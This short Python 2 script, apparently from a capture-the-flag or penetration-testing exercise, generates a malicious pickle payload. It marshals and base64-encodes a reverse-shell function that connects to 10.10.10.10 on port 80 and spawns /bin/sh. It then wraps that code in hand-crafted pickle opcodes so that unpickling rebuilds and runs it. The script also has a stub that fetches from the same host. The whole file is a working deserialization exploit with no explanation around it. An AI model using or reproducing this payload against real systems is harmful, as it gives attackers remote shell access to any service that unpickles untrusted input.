 #! /usr/bin/python
 import marshal
 import base64
 
 def foo():
     import requests;response = requests.get('http://10.10.10.10/pickle');
     pass # Your code here
 
 def revShell():
     import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",80 ));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
 
 print """ctypes
 FunctionType
 (cmarshal
 loads
 (cbase64
 b64decode
 (S'%s'
 tRtRc__builtin__
 globals
 (tRS''
 tR(tR.""" % base64.b64encode(marshal.dumps(revShell.func_code))
